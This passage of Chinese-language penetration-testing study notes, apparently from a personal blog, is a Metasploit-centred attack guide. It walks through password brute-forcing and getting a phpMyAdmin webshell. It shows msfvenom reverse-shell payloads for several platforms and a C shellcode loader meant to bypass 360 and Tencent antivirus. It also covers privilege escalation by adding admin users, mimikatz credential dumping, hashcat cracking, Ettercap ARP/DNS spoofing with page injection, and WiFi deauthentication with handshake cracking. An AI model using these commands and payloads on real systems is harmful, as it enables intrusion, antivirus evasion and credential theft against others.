<p>​    历史whois：<a target="_blank" rel="noopener" href="https://www.benmi.com/whoishistory/">https://www.benmi.com/whoishistory/</a></p>
<p>​    注册网站：<a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a></p>
<p>​    —DNS记录解析查询工具</p>
<p>​       nslookup</p>
<p>​       两种模式：</p>
<p>\1.  非交互模式：nslookup -qt=类型 目标域名（默认查询类型时a地址记录IPV4）</p>
<p>nslookup -qt=类型 目标域名 指定的DNS服务器IP或域名</p>
<p>​       \2. 交互模式：nslookup    进入交互模式</p>
<p>​           set qt=类型        指定查询类型，默认设置为a，IP或域名</p>
<p>​           set at=另一个类型     切换查询类型</p>
<p>​           help or ?          查看帮助</p>
<p>​           exit           退出nslookup交互模式</p>
<p>​       域名解析记录：</p>
<p>​           <a target="_blank" rel="noopener" href="https://www.22.cn/help_34.html">https://www.22.cn/help_34.html</a></p>
<p>​           <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liyuanhong/articles/7355153.html">https://www.cnblogs.com/liyuanhong/articles/7355153.html</a></p>
<p>​       在线nslookup：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></p>
<p>​       DNS域传送漏洞：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/h4ck0ne/p/5154651.html">https://www.cnblogs.com/h4ck0ne/p/5154651.html</a></p>
<p>——扫描模块</p>
<p>​    —db_nmap 常用的端口扫描指令</p>
<p>​        -sU：UDP扫描                  -sT：TCP扫描</p>
<p>​        -sV：扫描系统版本和程序版本检测</p>
<p>​        -n：禁止反向域名解析            -R：反向域名解析</p>
<p>​        -6：启用IPV6扫描               –script=vuln 全面的漏洞扫描</p>
<p>​        漏洞扫描，命令：</p>
<p>​           db_nmap –script=vuln 192.168.1.2</p>
<p>​           使用vuln脚本进行全面的漏洞扫描</p>
<p>​        指纹识别扫描，命令：</p>
<p>​           db_nmap -sV -v 192.168.1.2</p>
<p>​        扫描系统和程序版本号检测，并且输出详细信息</p>
<p>​    —自动化扫描插件wmap</p>
<p>​       使用命令：</p>
<p>​           msf&gt;load wmap    加载插件</p>
<p>​           msf&gt;wmap_sites -a url  添加目标</p>
<p>​           msf&gt;wmap_targets -t url   添加目标URL地址</p>
<p>​           msf&gt;wmap_run -e     测试目标</p>
<p>​           msf&gt;wmap_vulns      查看漏洞详细信息</p>
<p>——漏洞库-searchsploit</p>
<p>​    离线漏洞数据库搜索工具：searchsploit -t ftp</p>
<p>​    离线漏洞数据库帮助我们在测试时找到对方的POC或者利用脚本</p>
<p>​    手册：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/searchsploit">https://www.exploit-db.com/searchsploit</a></p>
<h2 id="MSF密码爆破模块"><a href="#MSF密码爆破模块" class="headerlink" title="MSF密码爆破模块"></a>MSF密码爆破模块</h2><p>——常见的加密方式</p>
<p>​    —MD5加密：常见的密码验证算法，用于操作系统的登陆认证</p>
<p>​       明文密码：存在规律性，可破解性，对应性（撞库）</p>
<p>​       密文：使用加密算法，唯一性，不可伪造性，不可逆性</p>
<p>​       常见的hash加密：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d53b9b5631e">https://www.jianshu.com/p/0d53b9b5631e</a></p>
<p>​                         <a target="_blank" rel="noopener" href="https://cmd5.com/">https://cmd5.com/</a></p>
<p>在线工具箱：<a target="_blank" rel="noopener" href="https://tool.bugku.com/">https://tool.bugku.com/</a></p>
<p>​    —验证hash值</p>
<p>​       windows自带工具验证hash值：</p>
<p>certutil /? 查看帮助    certutil -hashfile 1.jpg MD5 查看文件MD5值</p>
<p>作用：1. 验证文件是否损坏</p>
<p>​            2.验证文件是否被修改（后门）</p>
<p>案例：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/paper/147403.html">https://www.freebuf.com/articles/paper/147403.html</a></p>
<p>​      <a target="_blank" rel="noopener" href="https://www.qianxin.com/other/CVE-2019-0708">https://www.qianxin.com/other/CVE-2019-0708</a></p>
<p>——密码生成工具-genpAss</p>
<p>​    中国特色的弱口令生成器</p>
<p>​    指令： -n  名字   -u  用户名     -q  QQ号     -e  邮箱   -m 手机号</p>
<p>​           -b  生日，格式：2000-01-01      -c  公司名     -o  导出文件</p>
<p>​    地址：<a target="_blank" rel="noopener" href="https://github.com/RicterZ/genpAss">https://github.com/RicterZ/genpAss</a></p>
<p>​    安全趣闻：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/197414.html">https://www.freebuf.com/sectool/197414.html</a></p>
<p>​    密码泄露查询：<a target="_blank" rel="noopener" href="https://haveibeenpwned.com/Passwords">https://haveibeenpwned.com/Passwords</a></p>
<p>——查找爆破模块</p>
<p>​    查找关键词：login     msf&gt;search type:auxiliary login</p>
<p>​    查找服务名：msf&gt;search type:auxiliary name:ssh</p>
<p>​    查找服务名+关键词：msf&gt;search type:auxiliary name:phpMyAdmin login</p>
<p>——实战密码爆破</p>
<p>​    通过信息收集进行针对性的密码爆破</p>
<p>\1.  SSH密码爆破：模块名：auxiliary/scanner/ssh/ssh_login</p>
<p>\2.  mysql密码爆破：模块名：auxiliary/scanner/mysql/mysql_login</p>
<p>\3.  phpmyadmin登陆验证爆破：模块名：auxiliary/scanner/http/phpMyAdmin_login</p>
<h2 id="MSF-漏洞利用模块"><a href="#MSF-漏洞利用模块" class="headerlink" title="MSF-漏洞利用模块"></a>MSF-漏洞利用模块</h2><p>——快速搭建测试环境</p>
<p>​    使用phpstudy快速进行环境配置</p>
<p>​    它是一个PHP调试环境的程序集成包。</p>
<p>​    集成：Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便，好用的PHP调试环境，该程序不仅包括PHP调试环境，还包括了开发工具、开法手册等。</p>
<p>​    下载地址：<a target="_blank" rel="noopener" href="http://www.phpstudy.net/">http://www.phpstudy.net</a></p>
<p>​    配置问题：<a target="_blank" rel="noopener" href="http://www.xp.cn/wenda/388.html">http://www.xp.cn/wenda/388.html</a></p>
<p>​    运行库：<a target="_blank" rel="noopener" href="http://www.php.cn/xiazai/gongju/1351">http://www.php.cn/xiazai/gongju/1351</a></p>
<p>——phpmyadmin获取webshell</p>
<p>​    phpmyadmin日志写shell</p>
<p>​    前提：条件是root用户。思路：利用mysql的一个日志文件，这个日志文件每执行一个sql语句就会将其执行的保存。将这个日志文件重命名为shell.php，然后执行一条sql带一句话木马的命令。然后执行菜刀连接。</p>
<p>设置导出文件：编辑general log，general log file</p>
<p><a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin/index.php?token=c8c6084b26ebe891a039ca9f2d171876">http://localhost/phpMyAdmin/index.php?token=c8c6084b26ebe891a039ca9f2d171876</a></p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ddd41b841c36">https://www.jianshu.com/p/ddd41b841c36</a></p>
<p>——实战演示：phpmyadmin</p>
<p>​    从漏洞扫描到漏洞利用</p>
<p>​    扫描靶机：msf&gt;auxiliary/scanner/http/phpadmin_login</p>
<p>​    选择exploit：use exploit/multi/http/phpMyAdmin_lfi_rce</p>
<p>​    选择payload：set payload php/meterpreter/reverse_tcp</p>
<p>​    攻击：run/exploit</p>
<p>——反弹shell</p>
<p>​    连接一般分为正向连接和反向连接：</p>
<p>正向连接为：对方服务器开放端口，让我们去访问，例如使用：telnet 127.0.0.1:80</p>
<p>反向连接为：我们开放端口，让对方访问，例如，反弹shell</p>
<p>反弹shell：reverse shell，就是控制端监听在某tcp/udp端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
<p>​    为什么要反弹shell：1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了，他的ip会动态改变，不能持续控制。</p>
<p>\2.  由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>\3.  对于病毒、木马，受害者什么时候能中招，对方的网络环境怎样，什么时候开机都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
<p>——通过反弹shell获得的会话的常用命令</p>
<p>​    文件系统命令</p>
<p>​    edit    编辑文件      getlwd     显示本地工作目录</p>
<p>​    dir     列出目标文件目录     mkdir  创建目录</p>
<p>​    网络、系统命令</p>
<p>​    ifconfig    显示网络接口信息     netstat     显示网络连接信息</p>
<p>​    execute    执行命令      ps     列出正在运行的进程</p>
<p>​    sysinfo     获取远程系统的有关信息，例如OS</p>
<p>​    用户界面命令</p>
<p>​    getdesktop     获取当前用户桌面</p>
<p>​    screenshot     获取目标截图</p>
<p>​    授权、密码命令</p>
<p>​    getsystem     尝试获取系统权限</p>
<p>​    hashdump     获取目标NTDUMP</p>
<h2 id="MSF拿到shell后提权"><a href="#MSF拿到shell后提权" class="headerlink" title="MSF拿到shell后提权"></a>MSF拿到shell后提权</h2><p>——信息收集-目的-权限提升</p>
<p>​    目的：拿到管理员密码</p>
<p>\1.  通过phpmyadmin漏洞拿到webshell</p>
<p>\2.  权限提升：使用exp提权补丁进行权限提升，从用户权限到管理员权限：windows提权工具 <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p>使用MSF后渗透测试脚本提权。</p>
<p>——信息收集-提权辅助工具</p>
<p>​    快速查找exp提权补丁进行提权</p>
<p>\1.  在线辅助网页：在线比对补丁查找exp: <a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a></p>
<p>\2.  提权辅助工具：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
<p>——windows-exploit-suggester</p>
<p>​    从漏洞扫描到漏洞利用</p>
<p>​    suggester要求：python安装xlrd</p>
<p>​    安装xlrd：pip install xlrd –upgrade</p>
<p>​    先更新漏洞库：python windows-exploit-suggester.py –update</p>
<p>​    扫描systeminfo信息：这个系统可以提权的补丁有哪些</p>
<p>​    python windows-exploit-suggester.py -database 2019-12-06-mssb.xls –systeminfo sys.txt</p>
<p>​    审计本地可利用漏洞信息</p>
<p>​    python windows-exploit-suggester.py –audit -l –database 2019-12-06-mssb.xls –systeminfo sys.txt</p>
<p>​    未使用补丁该系统可能存在的漏洞</p>
<p>​    python windows-exploit-suggester.py -database 2019-12-06-mssb.xls –ostext ‘Windows 7’</p>
<p>——提权补丁：MS15-051</p>
<p>​    使用exp提取补丁创建用户</p>
<p>​    net user a a.1 /add：添加用户并设置密码</p>
<p>​    net localgroup administators a /add：将用户加入管理组</p>
<p>——MSF提权</p>
<p>​    使用MSF信息收集模块-查看提权脚本补丁</p>
<p>​    本地提权信息收集模块</p>
<p>​    use post/multi/recon/local_exploit_suggester</p>
<p>​    创建一个基础木马：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.221.138 lport=1520 -f exe -o shell.exe</p>
<p>——提权的姿势</p>
<p>\1.  绕过UAC进行提权</p>
<p>\2.  提供程序运行级别（runas）</p>
<p>这种方法可以利用exploit/windows/local/ask模块，但是该模块实际上只是以高权限重启一个返回式shellcode，并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择yes，就可以返回一个高权限meterpreter shell（需要执行getsystem）</p>
<p>\3.  利用windows提权漏洞进行提权</p>
<p>Ms13_053,ms14_058,ms16_016,ms16_032,</p>
<p>如exploit/windows/local/ms14_058_track_popup_menu</p>
<p>——获取管理员密码</p>
<p>​    —通过mimikatz获取管理员密码</p>
<p>​        windows使用指令：需要管理员权限</p>
<p>​        mimikatz.exe log</p>
<p>​        mimikatz # privilege::debug</p>
<p>​        mimikatz # sekurlsa::logonpasswords</p>
<p>​       mimikatz # exit</p>
<p>​       meterpreter&gt; mimikatz_command -f version //查看版本信息</p>
<p>​       meterpreter&gt; mimikatz_command -f samdump::hashes //读取本地hash</p>
<p>​       下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
<p>——windows hash</p>
<p>​    在线解密管理员密码</p>
<p>​    windows系统下的hash密码格式为：</p>
<p>​    用户名称：RID</p>
<p>​    LM-HASH值：</p>
<p>​    NT-HASH值：</p>
<p>​    LM-NT都是hash算法</p>
<p>​    在线解密：<a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
<h2 id="MSF-后门生成模块"><a href="#MSF-后门生成模块" class="headerlink" title="MSF-后门生成模块"></a>MSF-后门生成模块</h2><p>——常见的木马生成</p>
<p>​    使用MsFvenom快速生成木马并且进行连接</p>
<p>​    生成一个常见木马文件：</p>
<p>​    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -I 5 lhost=192.168.88.134 lport=1250 -f exe&gt;shell.exe</p>
<p>​    监听模块：use exploit/multi/handler</p>
<p>​    设置payload：set payload windows/meterpreter/reverse_tcp</p>
<p>​                set lhost 192.168.x.xx</p>
<p>​                set lport 1250</p>
<p>——常见后门生成方式</p>
<p>\1.  windows</p>
<p>msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp -I 3 -e x86/shikata_ga_nai -f exe -o c:\back.exe</p>
<p>msfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o c:\back.exe</p>
<p>\2.  Linux</p>
<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f elf&gt;shell.elf</p>
<p>\3.  MAC</p>
<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f macho&gt;shell.macho</p>
<p>\4.  PHP</p>
<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f raw&gt;shell.php</p>
<p>\5.  Asp</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f asp&gt;shell.asp</p>
<p>\6.  Aspx</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f aspx&gt;shell.aspx</p>
<p>——绕过360生成测试</p>
<p>​    生成后门文件绕过360检测</p>
<p>\1.  安装编译软件VC++6.0</p>
<p>\2.  生成木马后门</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b ‘\x00’ lhost=192.168.153.138 lport=1250 -f c</p>
<p>\3.  编译C语言为exe文件</p>
<p>#include “stdafx.h”</p>
<p>#include &lt;stdio.h&gt;</p>
<p>#pragma comment(linker, “/subsystem:\”windows/” /entry:\”mainCRTStartup””)</p>
<p>unsigned char buf[]=(这里放生成好的数组)</p>
<p>main(){((void(*)(void))&amp;buf)();}</p>
<p>\4.  测试是否成功</p>
<p>——绕过腾讯管家生成测试</p>
<p>\1.  编译c语言为exe文件</p>
<p>#include “stdafx.h”</p>
<p>#include &lt;stdio.h&gt;</p>
<p>#pragma comment(linker, “/subsystem:\”windows/” /entry:\”mainCRTStartup\””)</p>
<p>unsigned char buf[]=(这里放生成好的数组)</p>
<p>main(){((void(*)(void))&amp;buf)();}</p>
<p>\2.  测试是否成功</p>
<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><h2 id="密码破解-Hashcat"><a href="#密码破解-Hashcat" class="headerlink" title="密码破解-Hashcat"></a>密码破解-Hashcat</h2><p>——简介</p>
<p>​    hashcat号称世界上最快的密码破解，世界上第一个和唯一的基于GPUGPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（linux和windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等。目前支持各类公开算法高达247类，市面上公开的密码加密算法基本都支持。</p>
<p>​    官网：<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
<p>​    Wiki：<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a></p>
<p>​    下载地址：<a target="_blank" rel="noopener" href="https://hashcat.net/files/hashcat-5.1.0.7z">https://hashcat.net/files/hashcat-5.1.0.7z</a></p>
<p>​    在渗透测试中我们往往会得到很多hash，需要去解密，而一些在线的网站无法解密出来所以我们就可以使用hash在本地进行密码恢复</p>
<p>​    彩虹表：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bokun-wang/p/3887463.html">https://www.cnblogs.com/bokun-wang/p/3887463.html</a></p>
<p>​            <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/732d9d960411">https://www.jianshu.com/p/732d9d960411</a></p>
<p>——扫描模块</p>
<p>​    # | Mode</p>
<p> ===+======</p>
<p> 0 | Straight（字典破解）：基于字典进行破解</p>
<p> 1 | Combination（组合破解）：基于多个字典进行破解</p>
<p> 3 | Brute-force（掩码暴力破解）：基于掩码设置进行破解</p>
<p> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</p>
<p> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</p>
<p>——常见掩码设置</p>
<p>​    ? | Charset</p>
<p> ===+=========</p>
<p> l | abcdefghijklmnopqrstuvwxyz [a-z]                纯小写字母</p>
<p> u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]        纯大写字母</p>
<p> d | 0123456789         [0-9]             纯数字</p>
<p> h | 0123456789abcdef      [0-9a-f]          常见小写字母和数字</p>
<p> H | 0123456789ABCDEF      [0-9A-F]        常见大写字母和数字</p>
<p> s | !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~               特殊字符</p>
<p> a | ?l?u?d?s                                      键盘上所有可见字符</p>
<p> b | 0x00 - 0xff                         可能是用来匹配像空格这种密码的</p>
<p>​    八位数字密码：?d?d?d?d?d?d?d?d</p>
<p>​    八位未知密码：?a?a?a?a?a?a?a?a</p>
<p>​    前四位为大写字母，后四位为数字：?u?u?u?u?d?d?d?d</p>
<p>​    前四位是数字或者为小写字母，后四位是大写字母或者数字：?h?h?h?h?H?H?H?H</p>
<p>​    前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</p>
<p>​    6-8位字母密码：–increment –increment-min 6 –increment-max 8 ?l?l?l?l?l?l?l?l</p>
<p>​    6-8位数字+小写字母密码：–increment –increment-min 6 –increment-max 8 ?h?h?h?h?h?h?h?h</p>
<p>——常用参数</p>
<p>​    -a 指定要使用的破解模式，其值参考后面的参数。 “-a 0” 字典攻击， “-a 1” 组合攻击， “-a 3” 掩码攻击。</p>
<p>​    -m 指定要破解的hash类型，如果不指定类型，则默认是MD5。</p>
<p>​    -o 指定破解成功后的hash及所对应的明文密码的存放位置，可以用它把破解成功的hash写到指定的文件中。</p>
<p>​    –force 忽略破解过程中的警告信息，跑单条hash可能需要加上此选项。</p>
<p>​    –show 显示已经破解的hash所对应的明文</p>
<p>​    –increment 启用增量破解模式，可以利用此模式让hashcat在指定的密码长度内执行破解过程</p>
<p>​    –increment-min 密码最小长度，后面直接等于一个整数即可，配置increment模式一起使用。</p>
<p>​    –increment-max   密码最大长度，同上</p>
<p>​    –outfile-format    指定破解结果的输出格式id，默认是3</p>
<p>——破解实例</p>
<p>​    掩码破解</p>
<p>\1.  数字破解（8位：12345678）</p>
<p>hashcat -m 0 -a 3 <hash> ?d?d?d?d?d?d?d?d</p>
<p>\2.  小写字母（6位：abcdef）</p>
<p>hashcat -m 0 -a 3 <hash> ?l?l?l?l?l?l</p>
<p>\3.  字母+数字（8位：1a31fa1c）</p>
<p>hashcat -a 3 -m 0 –force <hash> –increment –increment-min 1 –increment-max 8 ?h?h?h?h?h?h?h?h</p>
<p>——字典破解</p>
<p>​    -a 0是指字典破解模式，-o是输出结果到文件中</p>
<p>​    字典破解密码：</p>
<p>hashcat -m 0 -a 0 ./dict/hash.txt ./dict/password.txt -o result.txt</p>
<p>——破解实例</p>
<p>\1.  破解windows hash</p>
<p>使用mimikatz获取windows hash:需要管理员权限</p>
<p>mimikatz log</p>
<p>mimikatz # privilege::debug</p>
<p>mimikatz # sekurlsa::logonpasswords</p>
<p>mimikatz # exit</p>
<p>NT-hash: hashcat -a 3 -m 1000 <hash> ?l?l?l?d?d?d?s</p>
<p>\2.  zip压缩包破解</p>
<p>使用zip2john获取哈希值</p>
<p>设置hash类型：win-zip    扫描模式：掩码模式</p>
<p>hashcat -m 13600 -a 3 <hash> ?d?d?d?d?d?d –show</p>
<h1 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h1><h2 id="wireshark初步认识"><a href="#wireshark初步认识" class="headerlink" title="wireshark初步认识"></a>wireshark初步认识</h2><p>——简介</p>
<p>​    它是世界上最流行的网络分析工具，这个强大的工具可以捕捉网络中的数据，并为用户提供关于网络和上层协议的各种信息。注：wireshark只能查看数据包，而不能修改数据包的内容，或者发送数据包。</p>
<p>​    官网：<a target="_blank" rel="noopener" href="https://www.wireshark.org/">https://www.wireshark.org</a></p>
<p>​    下载地址：<a target="_blank" rel="noopener" href="https://www.wireshark.org/#download">https://www.wireshark.org/#download</a></p>
<p>​    Wiki：<a target="_blank" rel="noopener" href="https://wiki.wireshark.org/">https://wiki.wireshark.org/</a></p>
<p>​    可以通过wireshark进行分析网络进程的数据包。</p>
<p>——初步使用</p>
<p>​    比较运算符和逻辑运算符</p>
<p>​    comparison operators（比较运算符）：可以使用6种比较运算符：</p>
<p>​    英文写法      C语言写法        含义</p>
<p>​    eq            ==               等于</p>
<p>​    ne            !=                不等于</p>
<p>​    gt             &gt;                大于</p>
<p>​    lt             &lt;                小于</p>
<p>​    ge            &gt;=               大于等于</p>
<p>​    le             &lt;=               小于等于</p>
<p>​    logical expressions（逻辑运算符）</p>
<p>​    英文写法      C语言写法        含义</p>
<p>​    and           &amp;&amp;               逻辑与</p>
<p>​    or             ||                 逻辑或</p>
<p>​    xor            ^^               逻辑异或</p>
<p>​    not           !                 逻辑非</p>
<p>——常见的过滤器</p>
<p>\1.  协议过滤</p>
<p>http.request.method == “POST” or icmp.type   显示post请求的数据包或icmp协议的数据包</p>
<p>​       ip.addr == 192.168.x.xx 显示ip地址192.168.x.xx相关的数据包</p>
<p>​       ip.src == 10.230.0.0/16  显示来自该网址网段的数据包</p>
<p>​       http.host == “192.168.x.xx” 显示该主机相关的数据包</p>
<p>​       tcp.port == 25  显示来源或目的的tcp端口号位25的数据包</p>
<p>​       tcp.dstport == 25   显示目的TCP端口号为25的数据包</p>
<p>​       http.response.code == 302  显示http响应状态码为302的数据包</p>
<p>\2.  内容过滤</p>
<p>contains: Does the protocol, field or slice contain a value</p>
<p>tcp contains “http”  显示包含http字符串的tcp数据包</p>
<p>http.host contains “192.168.x.xx” 显示包含该主机的数据包</p>
<p>——MSF嗅探数据包分析</p>
<p>\1.  通过分析存在nginx解析漏洞，通过上传图片马得到webshell。</p>
<p>\2.  生成MSF后门上传到对方服务器并执行，获取system权限。</p>
<p>\3.  开启嗅探并导出文件</p>
<p>load sniffer     sniffer_interfaces   sniffer_start 2   sniffer_stop 2</p>
<p>sniffer_dump 2 22.pc.ap</p>
<p>\4.  wireshark分析数据包，通过获取的数据包分析到对方明文传输密码</p>
<p>——WSExplorer分析</p>
<p>​    对软件进程数据包进行分析</p>
<h2 id="DNS劫持-Ettercap"><a href="#DNS劫持-Ettercap" class="headerlink" title="DNS劫持-Ettercap"></a>DNS劫持-Ettercap</h2><p>——ARP协议简介</p>
<p>​    ARP（Address Resolution Protocol）即地址解析协议，用于实现从IP地址到MAC地址的映射，即询问目标ip对应的MAC地址。</p>
<p>​    我们能够通过修改mac地址来达到中间人拦截、局域网流控、流量欺骗等情况。</p>
<p>——ettercap简介</p>
<p>​    Ettercap是一个综合性的中间人攻击工具，使用它可以进行ARP欺骗、拦截器、DNS欺骗等常见的中间人攻击。</p>
<p>​    特点：图形化、命令行</p>
<p>​    官网：<a target="_blank" rel="noopener" href="http://www.ettercap-project.org/">http://www.ettercap-project.org/</a></p>
<p>​    插件：<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/ettercap_plugins">https://linux.die.net/man/8/ettercap_plugins</a></p>
<p>​    过滤器：<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/etterfilter">https://linux.die.net/man/8/etterfilter</a></p>
<p>——Ettercap常用命令</p>
<p>\1.  用户界面类型</p>
<p>-T, -text    使用只显示字符的界面</p>
<p>-q, -quiet   安静模式，不显示抓到的数据包内容</p>
<p>-G, -gtk    使用GTK+GUI，开启图形化模式</p>
<p>​    \2. 日志选项</p>
<p>​       -w, -write <file>    将嗅探到的数据写入pcap文件<file></p>
<p>​       -L, -log <logfile>   此处记录所有流量<logfile></p>
<p>​    \3. 通用选项</p>
<p>​       -i, -iface <iface>   使用该网络接口</p>
<p>​       -l, -liface          显示所有的网络接口</p>
<p>​       -P, -plugin <plugin>   开始该插件</p>
<p>​       -F, -filter <file>    加载过滤器<file> （内容过滤）</p>
<p>​    \4. 嗅探与攻击选项</p>
<p>​       -M, mitm（方法：ARGS）  执行mitm攻击</p>
<p>——Ettercap案例</p>
<p>​    —ettercap开启dns欺骗</p>
<p>\1.  开启apache服务</p>
<p>编辑html文件：leafpad /var/www/html/</p>
<p>service apache2 start</p>
<p>\2.  编辑ettercap配置文件</p>
<p>leafpad /etc/Ettercap/etter.dns</p>
<p>\3.  Ettercap使用图形化</p>
<p>Ettercap -G</p>
<p>\4.  命令行测试</p>
<p>Ettercap -qT -i eth0 -M arp:remote -w 1.pcap /192.168.x.xx//192.168.xx.xxx/</p>
<p>—ettercap替换网页内容-钓鱼</p>
<p>\1.  准备过滤器脚本</p>
<p>官方示例脚本：/usr/share/Ettercap/etter filter.examples</p>
<p>\2.  编译脚本</p>
<p>etterfilter head.filter -o head.ef      //head.filter为脚本</p>
<p>\3.  受害者访问http网站</p>
<p>—过滤器脚本</p>
<p> if (ip.proto == TCP &amp;&amp; tcp.dst == 80) {</p>
<p>​    if (search(DATA.data, “Accept-Encoding”)) {</p>
<p>​              replace(“Accept-Encoding”, “Accept-Nothing”);</p>
<p>}</p>
<p>}</p>
<p>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {</p>
<p>​    if (search(DATA.data, “<head>”)) {</p>
<p>​    replace(“<head>”, “<head><script>alert(‘2333’)</script>”);</p>
<p>​    msg(“inject head”);</p>
<p>}</p>
<p>}</p>
<p>该过滤脚本的作用是在http网站中替换<head>内容。</p>
<h1 id="无线破解"><a href="#无线破解" class="headerlink" title="无线破解"></a>无线破解</h1><h2 id="无线WIFI破解"><a href="#无线WIFI破解" class="headerlink" title="无线WIFI破解"></a>无线WIFI破解</h2><p>——aircrack-ng简介</p>
<p>​    它是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a, 802.11b, 802.11g的数据。该程序可运行在linux和windows上。</p>
<p>​    开源项目：<a target="_blank" rel="noopener" href="https://github.com/aircrack-ng/aircrack-ng">https://github.com/aircrack-ng/aircrack-ng</a></p>
<p>​    官网：<a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/">https://www.aircrack-ng.org/</a></p>
<p>​    教程：<a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/~~V/doku.php?id=tutorial">https://www.aircrack-ng.org/~~V/doku.php?id=tutorial</a></p>
<p>——破解流程</p>
<p>\1.  查看网卡设备</p>
<p>命令：ifconfig/iwconfig</p>
<p>\2.  查看是否支持监听模式</p>
<p>命令：airmon-ng</p>
<p>\3.  开启无线网卡监听模式</p>
<p>airmon-ng start wlan0</p>
<p>\4.  查看周围WIFI网络</p>
<p>airodump-ng wlan0mon</p>
<p>\5.  监听目标网络的握手包</p>
<p>airodump-ng -c 11 –bssid 2C:57:31:60:27:E6 -w ~/1/ wlan0mon</p>
<p>参数解释：</p>
<p>-c 指定频道号</p>
<p>-bssid 指定路由器bssid</p>
<p>-w 指定抓取的数据包保存位置</p>
<p>​    \6. 强制对方WIFI断开重连（获取握手包）</p>
<p>​       aireplay-ng -0 2 -a 2C:57:31:60:27:E6 -c 60AB:67:F2:F5:A8 wlan0mon</p>
<p>​       参数解释：-0 表示发起（鉴权）deauthentication攻击</p>
<p>​                  -a 指定无线路由器BSSID</p>
<p>​                  -c 指定强制断开的设备</p>
<p>​    \7. 破解握手包密码</p>
<p>​       aircrack-ng -a2 -b 52:8F:4C:67:B1:91 -w pass.txt ~/-01/*.cap</p>
<p>​       参数解释：-a2 代表WPA的握手包</p>
<p>​                  -b 指定要破解的wifi BSSID</p>
<p>​                  -w 指定字典文件</p>
<p>​                  最后是抓取的包</p>
<p>​    \8. 关闭监听模式</p>
<p>​       airmon-ng stop wlanmon</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/python%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
